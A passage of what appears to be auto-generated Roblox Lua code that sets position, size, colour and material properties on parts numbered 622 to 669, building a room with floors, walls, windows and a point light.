        Part622.BrickColor = BrickColor.new("Really black")
        Part622.Material = Enum.Material.SmoothPlastic
        Part622.TopSurface = Enum.SurfaceType.Smooth
        Part622.brickColor = BrickColor.new("Really black")
        Part623.Parent = Model0
        Part623.CFrame = CFrame.new(-12.5500011, 11864.9004, 11.5500002, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part623.Position = Vector3.new(-12.55000114440918, 11864.900390625, 11.550000190734863)
        Part623.Color = Color3.new(0.94902, 0.952941, 0.952941)
        Part623.Size = Vector3.new(11.5, 0.4999999701976776, 2.8999977111816406)
        Part623.Anchored = true
        Part623.BottomSurface = Enum.SurfaceType.Smooth
        Part623.BrickColor = BrickColor.new("White")
        Part623.Material = Enum.Material.SmoothPlastic
        Part623.TopSurface = Enum.SurfaceType.Smooth
        Part623.brickColor = BrickColor.new("White")
        Part624.Name = "Floor"
        Part624.Parent = Model0
        Part624.CFrame = CFrame.new(2.99999428, 11853.9004, 22.6000061, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part624.Position = Vector3.new(2.9999942779541016, 11853.900390625, 22.600006103515625)
        Part624.Color = Color3.new(0.94902, 0.952941, 0.952941)
        Part624.Size = Vector3.new(19.999998092651367, 0.10000000149011612, 19)
        Part624.Anchored = true
        Part624.BottomSurface = Enum.SurfaceType.Smooth
        Part624.BrickColor = BrickColor.new("White")
        Part624.Material = Enum.Material.SmoothPlastic
        Part624.TopSurface = Enum.SurfaceType.Smooth
        Part624.brickColor = BrickColor.new("White")
        Texture625.Parent = Part624
        Texture625.Texture = "rbxassetid://4224711125"
        Texture625.Face = Enum.NormalId.Top
        Texture625.Color3 = Color3.new(0.831373, 0.831373, 0.831373)
        Texture625.StudsPerTileU = 5.5
        Texture625.StudsPerTileV = 5.5
        Part626.Parent = Model0
        Part626.CFrame = CFrame.new(-7.05000496, 11857.7002, 10.1500063, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part626.Position = Vector3.new(-7.050004959106445, 11857.7001953125, 10.150006294250488)
        Part626.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part626.Size = Vector3.new(0.09999990463256836, 7.5, 0.10000000149011612)
        Part626.Anchored = true
        Part626.BottomSurface = Enum.SurfaceType.Smooth
        Part626.BrickColor = BrickColor.new("Really black")
        Part626.Material = Enum.Material.SmoothPlastic
        Part626.TopSurface = Enum.SurfaceType.Smooth
        Part626.brickColor = BrickColor.new("Really black")
        Part627.Parent = Model0
        Part627.CFrame = CFrame.new(-7.05000114, 11855.7002, 11.6500101, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part627.Position = Vector3.new(-7.05000114440918, 11855.7001953125, 11.650010108947754)
        Part627.Color = Color3.new(0.803922, 0.803922, 0.803922)
        Part627.Size = Vector3.new(0.09999990463256836, 3.499999761581421, 2.9000000953674316)
        Part627.Anchored = true
        Part627.BottomSurface = Enum.SurfaceType.Smooth
        Part627.BrickColor = BrickColor.new("Mid gray")
        Part627.Material = Enum.Material.Cobblestone
        Part627.TopSurface = Enum.SurfaceType.Smooth
        Part627.brickColor = BrickColor.new("Mid gray")
        Part628.Parent = Model0
        Part628.CFrame = CFrame.new(-7.05000496, 11861.0498, 11.6500063, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part628.Orientation = Vector3.new(0, 90, 0)
        Part628.Position = Vector3.new(-7.050004959106445, 11861.0498046875, 11.650006294250488)
        Part628.Rotation = Vector3.new(0, 90, 0)
        Part628.Color = Color3.new(0.94902, 0.952941, 0.952941)
        Part628.Size = Vector3.new(2.9000000953674316, 7.199999809265137, 0.10000000149011612)
        Part628.Anchored = true
        Part628.BottomSurface = Enum.SurfaceType.Smooth
        Part628.BrickColor = BrickColor.new("White")
        Part628.Material = Enum.Material.SmoothPlastic
        Part628.TopSurface = Enum.SurfaceType.Smooth
        Part628.brickColor = BrickColor.new("White")
        Part629.Name = "Floor"
        Part629.Parent = Model0
        Part629.CFrame = CFrame.new(-12.2000065, 11853.9004, 5.60000706, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part629.Position = Vector3.new(-12.200006484985352, 11853.900390625, 5.600007057189941)
        Part629.Color = Color3.new(0.94902, 0.952941, 0.952941)
        Part629.Size = Vector3.new(10.399998664855957, 0.10000000149011612, 14.999998092651367)
        Part629.Anchored = true
        Part629.BottomSurface = Enum.SurfaceType.Smooth
        Part629.BrickColor = BrickColor.new("White")
        Part629.Material = Enum.Material.SmoothPlastic
        Part629.TopSurface = Enum.SurfaceType.Smooth
        Part629.brickColor = BrickColor.new("White")
        Texture630.Parent = Part629
        Texture630.Texture = "rbxassetid://4224711125"
        Texture630.Face = Enum.NormalId.Top
        Texture630.Color3 = Color3.new(0.831373, 0.831373, 0.831373)
        Texture630.StudsPerTileU = 5.5
        Texture630.StudsPerTileV = 5.5
        Part631.Parent = Model0
        Part631.CFrame = CFrame.new(-6.95000267, 11863.9004, 21.1500053, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part631.Position = Vector3.new(-6.950002670288086, 11863.900390625, 21.150005340576172)
        Part631.Color = Color3.new(0.94902, 0.952941, 0.952941)
        Part631.Size = Vector3.new(0.10000000149011612, 1.5, 16.100000381469727)
        Part631.Anchored = true
        Part631.BottomSurface = Enum.SurfaceType.Smooth
        Part631.BrickColor = BrickColor.new("White")
        Part631.Material = Enum.Material.SmoothPlastic
        Part631.TopSurface = Enum.SurfaceType.Smooth
        Part631.brickColor = BrickColor.new("White")
        Part632.Parent = Model0
        Part632.CFrame = CFrame.new(-17.3500042, 11863.9004, 5.60000706, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part632.Position = Vector3.new(-17.350004196166992, 11863.900390625, 5.600007057189941)
        Part632.Color = Color3.new(0.94902, 0.952941, 0.952941)
        Part632.Size = Vector3.new(0.09999990463256836, 1.5, 9)
        Part632.Anchored = true
        Part632.BottomSurface = Enum.SurfaceType.Smooth
        Part632.BrickColor = BrickColor.new("White")
        Part632.Material = Enum.Material.SmoothPlastic
        Part632.TopSurface = Enum.SurfaceType.Smooth
        Part632.brickColor = BrickColor.new("White")
        Part633.Name = "Window"
        Part633.Parent = Model0
        Part633.CFrame = CFrame.new(-6.95000267, 11859.6504, 15.9000025, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part633.Position = Vector3.new(-6.950002670288086, 11859.650390625, 15.900002479553223)
        Part633.Color = Color3.new(0.94902, 0.952941, 0.952941)
        Part633.Size = Vector3.new(0.09999990463256836, 6.800000190734863, 5.199999809265137)
        Part633.Anchored = true
        Part633.BottomSurface = Enum.SurfaceType.Smooth
        Part633.BrickColor = BrickColor.new("White")
        Part633.Material = Enum.Material.Glass
        Part633.Reflectance = 1
        Part633.TopSurface = Enum.SurfaceType.Smooth
        Part633.brickColor = BrickColor.new("White")
        Part634.Parent = Model0
        Part634.CFrame = CFrame.new(-6.95000648, 11859.6504, 18.6000023, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part634.Position = Vector3.new(-6.950006484985352, 11859.650390625, 18.60000228881836)
        Part634.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part634.Size = Vector3.new(0.09999990463256836, 6.800000190734863, 0.19999998807907104)
        Part634.Anchored = true
        Part634.BottomSurface = Enum.SurfaceType.Smooth
        Part634.BrickColor = BrickColor.new("Really black")
        Part634.Material = Enum.Material.SmoothPlastic
        Part634.TopSurface = Enum.SurfaceType.Smooth
        Part634.brickColor = BrickColor.new("Really black")
        Part635.Parent = Model0
        Part635.CFrame = CFrame.new(-6.95000648, 11859.6504, 13.2000093, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part635.Position = Vector3.new(-6.950006484985352, 11859.650390625, 13.2000093460083)
        Part635.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part635.Size = Vector3.new(0.09999990463256836, 7, 0.19999998807907104)
        Part635.Anchored = true
        Part635.BottomSurface = Enum.SurfaceType.Smooth
        Part635.BrickColor = BrickColor.new("Really black")
        Part635.Material = Enum.Material.SmoothPlastic
        Part635.TopSurface = Enum.SurfaceType.Smooth
        Part635.brickColor = BrickColor.new("Really black")
        Part636.Parent = Model0
        Part636.CFrame = CFrame.new(-6.95000267, 11863.1006, 21.1500053, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part636.Position = Vector3.new(-6.950002670288086, 11863.1005859375, 21.150005340576172)
        Part636.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part636.Size = Vector3.new(0.09999990463256836, 0.09999996423721313, 15.699999809265137)
        Part636.Anchored = true
        Part636.BottomSurface = Enum.SurfaceType.Smooth
        Part636.BrickColor = BrickColor.new("Really black")
        Part636.Material = Enum.Material.SmoothPlastic
        Part636.TopSurface = Enum.SurfaceType.Smooth
        Part636.brickColor = BrickColor.new("Really black")
        Part637.Parent = Model0
        Part637.CFrame = CFrame.new(-8.44999886, 11857.5498, 13.2000132, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part637.Position = Vector3.new(-8.44999885559082, 11857.5498046875, 13.200013160705566)
        Part637.Color = Color3.new(0.929412, 0.917647, 0.917647)
        Part637.Size = Vector3.new(2.9000000953674316, 0.19999995827674866, 0.19999924302101135)
        Part637.Anchored = true
        Part637.BottomSurface = Enum.SurfaceType.Smooth
        Part637.BrickColor = BrickColor.new("Lily white")
        Part637.Material = Enum.Material.Wood
        Part637.TopSurface = Enum.SurfaceType.Smooth
        Part637.brickColor = BrickColor.new("Lily white")
        Part638.Parent = Model0
        Part638.CFrame = CFrame.new(-8.40000343, 11855.7002, 13.0500116, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part638.Position = Vector3.new(-8.400003433227539, 11855.7001953125, 13.05001163482666)
        Part638.Color = Color3.new(0.803922, 0.803922, 0.803922)
        Part638.Size = Vector3.new(3, 3.499999761581421, 0.10000000149011612)
        Part638.Anchored = true
        Part638.BottomSurface = Enum.SurfaceType.Smooth
        Part638.BrickColor = BrickColor.new("Mid gray")
        Part638.Material = Enum.Material.Cobblestone
        Part638.TopSurface = Enum.SurfaceType.Smooth
        Part638.brickColor = BrickColor.new("Mid gray")
        Part639.Parent = Model0
        Part639.CFrame = CFrame.new(-9.94999886, 11857.7002, 13.0500231, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part639.Position = Vector3.new(-9.94999885559082, 11857.7001953125, 13.050023078918457)
        Part639.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part639.Size = Vector3.new(0.09999990463256836, 7.5, 0.10000000149011612)
        Part639.Anchored = true
        Part639.BottomSurface = Enum.SurfaceType.Smooth
        Part639.BrickColor = BrickColor.new("Really black")
        Part639.Material = Enum.Material.SmoothPlastic
        Part639.TopSurface = Enum.SurfaceType.Smooth
        Part639.brickColor = BrickColor.new("Really black")
        Part640.Parent = Model0
        Part640.CFrame = CFrame.new(-12.1499958, 11861.501, 13.0500231, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part640.Position = Vector3.new(-12.149995803833008, 11861.5009765625, 13.050023078918457)
        Part640.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part640.Size = Vector3.new(4.5, 0.09999990463256836, 0.10000000149011612)
        Part640.Anchored = true
        Part640.BottomSurface = Enum.SurfaceType.Smooth
        Part640.BrickColor = BrickColor.new("Really black")
        Part640.Material = Enum.Material.SmoothPlastic
        Part640.TopSurface = Enum.SurfaceType.Smooth
        Part640.brickColor = BrickColor.new("Really black")
        Part641.Parent = Model0
        Part641.CFrame = CFrame.new(-17.5500011, 11857.5498, -0.499983788, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part641.Position = Vector3.new(-17.55000114440918, 11857.5498046875, -0.4999837875366211)
        Part641.Color = Color3.new(0.929412, 0.917647, 0.917647)
        Part641.Size = Vector3.new(0.2999998927116394, 0.19999995827674866, 3.1999998092651367)
        Part641.Anchored = true
        Part641.BottomSurface = Enum.SurfaceType.Smooth
        Part641.BrickColor = BrickColor.new("Lily white")
        Part641.Material = Enum.Material.Wood
        Part641.TopSurface = Enum.SurfaceType.Smooth
        Part641.brickColor = BrickColor.new("Lily white")
        Part642.Name = "Window"
        Part642.Parent = Model0
        Part642.CFrame = CFrame.new(-17.3500042, 11859.0498, 5.60001087, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part642.Position = Vector3.new(-17.350004196166992, 11859.0498046875, 5.600010871887207)
        Part642.Color = Color3.new(0.94902, 0.952941, 0.952941)
        Part642.Transparency = 0.4000000059604645
        Part642.Size = Vector3.new(0.09999990463256836, 8, 8.600000381469727)
        Part642.Anchored = true
        Part642.BottomSurface = Enum.SurfaceType.Smooth
        Part642.BrickColor = BrickColor.new("White")
        Part642.Material = Enum.Material.Glass
        Part642.TopSurface = Enum.SurfaceType.Smooth
        Part642.brickColor = BrickColor.new("White")
        Part643.Parent = Model0
        Part643.CFrame = CFrame.new(-17.3500042, 11863.1006, 5.60001087, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part643.Position = Vector3.new(-17.350004196166992, 11863.1005859375, 5.600010871887207)
        Part643.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part643.Size = Vector3.new(0.09999990463256836, 0.09999942779541016, 8.600000381469727)
        Part643.Anchored = true
        Part643.BottomSurface = Enum.SurfaceType.Smooth
        Part643.BrickColor = BrickColor.new("Really black")
        Part643.Material = Enum.Material.SmoothPlastic
        Part643.TopSurface = Enum.SurfaceType.Smooth
        Part643.brickColor = BrickColor.new("Really black")
        Part644.Parent = Model0
        Part644.CFrame = CFrame.new(-17.3500042, 11859.0498, 1.20000935, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part644.Position = Vector3.new(-17.350004196166992, 11859.0498046875, 1.2000093460083008)
        Part644.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part644.Size = Vector3.new(0.09999990463256836, 8.199999809265137, 0.19999998807907104)
        Part644.Anchored = true
        Part644.BottomSurface = Enum.SurfaceType.Smooth
        Part644.BrickColor = BrickColor.new("Really black")
        Part644.Material = Enum.Material.SmoothPlastic
        Part644.TopSurface = Enum.SurfaceType.Smooth
        Part644.brickColor = BrickColor.new("Really black")
        Part645.Parent = Model0
        Part645.CFrame = CFrame.new(-8.40000343, 11861.0498, 13.0500116, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part645.Position = Vector3.new(-8.400003433227539, 11861.0498046875, 13.05001163482666)
        Part645.Color = Color3.new(0.94902, 0.952941, 0.952941)
        Part645.Size = Vector3.new(3, 7.199999809265137, 0.10000000149011612)
        Part645.Anchored = true
        Part645.BottomSurface = Enum.SurfaceType.Smooth
        Part645.BrickColor = BrickColor.new("White")
        Part645.Material = Enum.Material.SmoothPlastic
        Part645.TopSurface = Enum.SurfaceType.Smooth
        Part645.brickColor = BrickColor.new("White")
        Part646.Parent = Model0
        Part646.CFrame = CFrame.new(-17.3500042, 11855.7002, -0.399989128, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part646.Position = Vector3.new(-17.350004196166992, 11855.7001953125, -0.39998912811279297)
        Part646.Color = Color3.new(0.803922, 0.803922, 0.803922)
        Part646.Size = Vector3.new(0.09999990463256836, 3.499999761581421, 3)
        Part646.Anchored = true
        Part646.BottomSurface = Enum.SurfaceType.Smooth
        Part646.BrickColor = BrickColor.new("Mid gray")
        Part646.Material = Enum.Material.Cobblestone
        Part646.TopSurface = Enum.SurfaceType.Smooth
        Part646.brickColor = BrickColor.new("Mid gray")
        Part647.Parent = Model0
        Part647.CFrame = CFrame.new(-15.8500004, 11865.7998, 13.0500116, -1, 0, 0, 0, 1, 0, 0, 0, -1)
        Part647.Orientation = Vector3.new(0, 180, 0)
        Part647.Position = Vector3.new(-15.850000381469727, 11865.7998046875, 13.05001163482666)
        Part647.Rotation = Vector3.new(-180, 0, -180)
        Part647.Color = Color3.new(1, 0, 0)
        Part647.Size = Vector3.new(2.9000000953674316, 16.700000762939453, 0.10000000149011612)
        Part647.Anchored = true
        Part647.BottomSurface = Enum.SurfaceType.Smooth
        Part647.BrickColor = BrickColor.new("Really red")
        Part647.Material = Enum.Material.SmoothPlastic
        Part647.TopSurface = Enum.SurfaceType.Smooth
        Part647.brickColor = BrickColor.new("Really red")
        Part648.Name = "Light"
        Part648.Parent = Model0
        Part648.CFrame = CFrame.new(-12.4000034, 11864.1504, 5.80000782, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part648.Position = Vector3.new(-12.400003433227539, 11864.150390625, 5.8000078201293945)
        Part648.Color = Color3.new(0.960784, 0.803922, 0.188235)
        Part648.Transparency = 1
        Part648.Size = Vector3.new(1, 1, 1)
        Part648.Anchored = true
        Part648.BottomSurface = Enum.SurfaceType.Smooth
        Part648.BrickColor = BrickColor.new("Bright yellow")
        Part648.Material = Enum.Material.ForceField
        Part648.TopSurface = Enum.SurfaceType.Smooth
        Part648.brickColor = BrickColor.new("Bright yellow")
        PointLight649.Parent = Part648
        PointLight649.Range = 20
        PointLight649.Shadows = true
        Part650.Parent = Model0
        Part650.CFrame = CFrame.new(-7.05000496, 11857.7002, 1.15000629, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part650.Position = Vector3.new(-7.050004959106445, 11857.7001953125, 1.1500062942504883)
        Part650.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part650.Size = Vector3.new(0.09999990463256836, 7.5, 0.10000000149011612)
        Part650.Anchored = true
        Part650.BottomSurface = Enum.SurfaceType.Smooth
        Part650.BrickColor = BrickColor.new("Really black")
        Part650.Material = Enum.Material.SmoothPlastic
        Part650.TopSurface = Enum.SurfaceType.Smooth
        Part650.brickColor = BrickColor.new("Really black")
        Part651.Parent = Model0
        Part651.CFrame = CFrame.new(-7.05000114, 11855.7002, -0.349989891, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part651.Position = Vector3.new(-7.05000114440918, 11855.7001953125, -0.3499898910522461)
        Part651.Color = Color3.new(0.803922, 0.803922, 0.803922)
        Part651.Size = Vector3.new(0.09999990463256836, 3.499999761581421, 2.9000000953674316)
        Part651.Anchored = true
        Part651.BottomSurface = Enum.SurfaceType.Smooth
        Part651.BrickColor = BrickColor.new("Mid gray")
        Part651.Material = Enum.Material.Cobblestone
        Part651.TopSurface = Enum.SurfaceType.Smooth
        Part651.brickColor = BrickColor.new("Mid gray")
        Part652.Parent = Model0
        Part652.CFrame = CFrame.new(-19.2500057, 11853.9502, -9.99999142, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part652.Position = Vector3.new(-19.2500057220459, 11853.9501953125, -9.999991416931152)
        Part652.Color = Color3.new(0.388235, 0.372549, 0.384314)
        Part652.Size = Vector3.new(9.5, 0.19999995827674866, 16.200000762939453)
        Part652.Anchored = true
        Part652.BottomSurface = Enum.SurfaceType.Smooth
        Part652.BrickColor = BrickColor.new("Dark stone grey")
        Part652.Material = Enum.Material.Concrete
        Part652.TopSurface = Enum.SurfaceType.Smooth
        Part652.brickColor = BrickColor.new("Dark stone grey")
        Part653.Name = "Floor"
        Part653.Parent = Model0
        Part653.CFrame = CFrame.new(-10.7500057, 11853.9004, -9.84998989, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part653.Position = Vector3.new(-10.750005722045898, 11853.900390625, -9.849989891052246)
        Part653.Color = Color3.new(0.94902, 0.952941, 0.952941)
        Part653.Size = Vector3.new(7.499998569488525, 0.10000000149011612, 16.499998092651367)
        Part653.Anchored = true
        Part653.BottomSurface = Enum.SurfaceType.Smooth
        Part653.BrickColor = BrickColor.new("White")
        Part653.Material = Enum.Material.SmoothPlastic
        Part653.TopSurface = Enum.SurfaceType.Smooth
        Part653.brickColor = BrickColor.new("White")
        Texture654.Parent = Part653
        Texture654.Texture = "rbxassetid://4224711125"
        Texture654.Face = Enum.NormalId.Top
        Texture654.Color3 = Color3.new(0.831373, 0.831373, 0.831373)
        Texture654.StudsPerTileU = 5.5
        Texture654.StudsPerTileV = 5.5
        Part655.Parent = Model0
        Part655.CFrame = CFrame.new(-12.1500034, 11861.0498, -1.84998989, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part655.Position = Vector3.new(-12.150003433227539, 11861.0498046875, -1.849989891052246)
        Part655.Color = Color3.new(0.94902, 0.952941, 0.952941)
        Part655.Size = Vector3.new(10.300000190734863, 7.199999809265137, 0.10000000149011612)
        Part655.Anchored = true
        Part655.BottomSurface = Enum.SurfaceType.Smooth
        Part655.BrickColor = BrickColor.new("White")
        Part655.Material = Enum.Material.SmoothPlastic
        Part655.TopSurface = Enum.SurfaceType.Smooth
        Part655.brickColor = BrickColor.new("White")
        Part656.Parent = Model0
        Part656.CFrame = CFrame.new(-15.9499989, 11857.5498, -1.9999876, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part656.Position = Vector3.new(-15.94999885559082, 11857.5498046875, -1.9999876022338867)
        Part656.Color = Color3.new(0.929412, 0.917647, 0.917647)
        Part656.Size = Vector3.new(2.9000000953674316, 0.19999995827674866, 0.19999924302101135)
        Part656.Anchored = true
        Part656.BottomSurface = Enum.SurfaceType.Smooth
        Part656.BrickColor = BrickColor.new("Lily white")
        Part656.Material = Enum.Material.Wood
        Part656.TopSurface = Enum.SurfaceType.Smooth
        Part656.brickColor = BrickColor.new("Lily white")
        Part657.Parent = Model0
        Part657.CFrame = CFrame.new(-17.3500042, 11861.0498, -0.399992943, 0, 0, 1, 0, 1, 0, -1, 0, 0)
        Part657.Orientation = Vector3.new(0, 90, 0)
        Part657.Position = Vector3.new(-17.350004196166992, 11861.0498046875, -0.3999929428100586)
        Part657.Rotation = Vector3.new(0, 90, 0)
        Part657.Color = Color3.new(0.94902, 0.952941, 0.952941)
        Part657.Size = Vector3.new(3, 7.199999809265137, 0.10000000149011612)
        Part657.Anchored = true
        Part657.BottomSurface = Enum.SurfaceType.Smooth
        Part657.BrickColor = BrickColor.new("White")
        Part657.Material = Enum.Material.SmoothPlastic
        Part657.TopSurface = Enum.SurfaceType.Smooth
        Part657.brickColor = BrickColor.new("White")
        Part658.Parent = Model0
        Part658.CFrame = CFrame.new(-12.1500034, 11855.7002, -1.84998989, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part658.Position = Vector3.new(-12.150003433227539, 11855.7001953125, -1.849989891052246)
        Part658.Color = Color3.new(0.803922, 0.803922, 0.803922)
        Part658.Size = Vector3.new(10.300000190734863, 3.499999761581421, 0.10000000149011612)
        Part658.Anchored = true
        Part658.BottomSurface = Enum.SurfaceType.Smooth
        Part658.BrickColor = BrickColor.new("Mid gray")
        Part658.Material = Enum.Material.Cobblestone
        Part658.TopSurface = Enum.SurfaceType.Smooth
        Part658.brickColor = BrickColor.new("Mid gray")
        Part659.Name = "Window"
        Part659.Parent = Model0
        Part659.CFrame = CFrame.new(-14.4500027, 11859.6504, -3.59999752, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part659.Position = Vector3.new(-14.450002670288086, 11859.650390625, -3.5999975204467773)
        Part659.Color = Color3.new(0.94902, 0.952941, 0.952941)
        Part659.Transparency = 0.4000000059604645
        Part659.Size = Vector3.new(0.09999990463256836, 6.800000190734863, 3)
        Part659.Anchored = true
        Part659.BottomSurface = Enum.SurfaceType.Smooth
        Part659.BrickColor = BrickColor.new("White")
        Part659.Material = Enum.Material.Glass
        Part659.TopSurface = Enum.SurfaceType.Smooth
        Part659.brickColor = BrickColor.new("White")
        Part660.Name = "Window"
        Part660.Parent = Model0
        Part660.CFrame = CFrame.new(-14.4500027, 11859.6504, -6.8000021, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part660.Position = Vector3.new(-14.450002670288086, 11859.650390625, -6.800002098083496)
        Part660.Color = Color3.new(0.94902, 0.952941, 0.952941)
        Part660.Transparency = 0.4000000059604645
        Part660.Size = Vector3.new(0.09999990463256836, 6.800000190734863, 3)
        Part660.Anchored = true
        Part660.BottomSurface = Enum.SurfaceType.Smooth
        Part660.BrickColor = BrickColor.new("White")
        Part660.Material = Enum.Material.Glass
        Part660.TopSurface = Enum.SurfaceType.Smooth
        Part660.brickColor = BrickColor.new("White")
        Part661.Name = "Window"
        Part661.Parent = Model0
        Part661.CFrame = CFrame.new(-14.4500027, 11859.6504, -9.99999905, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part661.Position = Vector3.new(-14.450002670288086, 11859.650390625, -9.999999046325684)
        Part661.Color = Color3.new(0.94902, 0.952941, 0.952941)
        Part661.Transparency = 0.4000000059604645
        Part661.Size = Vector3.new(0.09999990463256836, 6.800000190734863, 3)
        Part661.Anchored = true
        Part661.BottomSurface = Enum.SurfaceType.Smooth
        Part661.BrickColor = BrickColor.new("White")
        Part661.Material = Enum.Material.Glass
        Part661.TopSurface = Enum.SurfaceType.Smooth
        Part661.brickColor = BrickColor.new("White")
        Part662.Parent = Model0
        Part662.CFrame = CFrame.new(-14.4500027, 11856.2002, -3.59999752, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part662.Position = Vector3.new(-14.450002670288086, 11856.2001953125, -3.5999975204467773)
        Part662.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part662.Size = Vector3.new(0.09999990463256836, 0.09999996423721313, 3)
        Part662.Anchored = true
        Part662.BottomSurface = Enum.SurfaceType.Smooth
        Part662.BrickColor = BrickColor.new("Really black")
        Part662.Material = Enum.Material.SmoothPlastic
        Part662.TopSurface = Enum.SurfaceType.Smooth
        Part662.brickColor = BrickColor.new("Really black")
        Part663.Parent = Model0
        Part663.CFrame = CFrame.new(-14.4500065, 11859.6504, -1.99999905, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part663.Position = Vector3.new(-14.450006484985352, 11859.650390625, -1.9999990463256836)
        Part663.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part663.Size = Vector3.new(0.09999990463256836, 7, 0.19999998807907104)
        Part663.Anchored = true
        Part663.BottomSurface = Enum.SurfaceType.Smooth
        Part663.BrickColor = BrickColor.new("Really black")
        Part663.Material = Enum.Material.SmoothPlastic
        Part663.TopSurface = Enum.SurfaceType.Smooth
        Part663.brickColor = BrickColor.new("Really black")
        Part664.Parent = Model0
        Part664.CFrame = CFrame.new(-14.4500027, 11856.2002, -6.8000021, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part664.Position = Vector3.new(-14.450002670288086, 11856.2001953125, -6.800002098083496)
        Part664.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part664.Size = Vector3.new(0.09999990463256836, 0.09999996423721313, 3)
        Part664.Anchored = true
        Part664.BottomSurface = Enum.SurfaceType.Smooth
        Part664.BrickColor = BrickColor.new("Really black")
        Part664.Material = Enum.Material.SmoothPlastic
        Part664.TopSurface = Enum.SurfaceType.Smooth
        Part664.brickColor = BrickColor.new("Really black")
        Part665.Parent = Model0
        Part665.CFrame = CFrame.new(-14.4500065, 11859.6504, -5.19999599, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part665.Position = Vector3.new(-14.450006484985352, 11859.650390625, -5.199995994567871)
        Part665.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part665.Size = Vector3.new(0.09999990463256836, 7, 0.19999998807907104)
        Part665.Anchored = true
        Part665.BottomSurface = Enum.SurfaceType.Smooth
        Part665.BrickColor = BrickColor.new("Really black")
        Part665.Material = Enum.Material.SmoothPlastic
        Part665.TopSurface = Enum.SurfaceType.Smooth
        Part665.brickColor = BrickColor.new("Really black")
        Part666.Parent = Model0
        Part666.CFrame = CFrame.new(-14.4500027, 11856.2002, -9.99999905, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part666.Position = Vector3.new(-14.450002670288086, 11856.2001953125, -9.999999046325684)
        Part666.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part666.Size = Vector3.new(0.09999990463256836, 0.09999996423721313, 3)
        Part666.Anchored = true
        Part666.BottomSurface = Enum.SurfaceType.Smooth
        Part666.BrickColor = BrickColor.new("Really black")
        Part666.Material = Enum.Material.SmoothPlastic
        Part666.TopSurface = Enum.SurfaceType.Smooth
        Part666.brickColor = BrickColor.new("Really black")
        Part667.Parent = Model0
        Part667.CFrame = CFrame.new(-14.4500065, 11859.6504, -8.40000057, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part667.Position = Vector3.new(-14.450006484985352, 11859.650390625, -8.40000057220459)
        Part667.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part667.Size = Vector3.new(0.09999990463256836, 7, 0.19999998807907104)
        Part667.Anchored = true
        Part667.BottomSurface = Enum.SurfaceType.Smooth
        Part667.BrickColor = BrickColor.new("Really black")
        Part667.Material = Enum.Material.SmoothPlastic
        Part667.TopSurface = Enum.SurfaceType.Smooth
        Part667.brickColor = BrickColor.new("Really black")
        Part668.Parent = Model0
        Part668.CFrame = CFrame.new(-14.4500027, 11856.2002, -13.199996, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part668.Position = Vector3.new(-14.450002670288086, 11856.2001953125, -13.199995994567871)
        Part668.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part668.Size = Vector3.new(0.09999990463256836, 0.09999996423721313, 3)
        Part668.Anchored = true
        Part668.BottomSurface = Enum.SurfaceType.Smooth
        Part668.BrickColor = BrickColor.new("Really black")
        Part668.Material = Enum.Material.SmoothPlastic
        Part668.TopSurface = Enum.SurfaceType.Smooth
        Part668.brickColor = BrickColor.new("Really black")
        Part669.Parent = Model0
        Part669.CFrame = CFrame.new(-14.4500027, 11855.0498, -9.99999142, 1, 0, 0, 0, 1, 0, 0, 0, 1)
        Part669.Position = Vector3.new(-14.450002670288086, 11855.0498046875, -9.999991416931152)
        Part669.Color = Color3.new(0.94902, 0.952941, 0.952941)
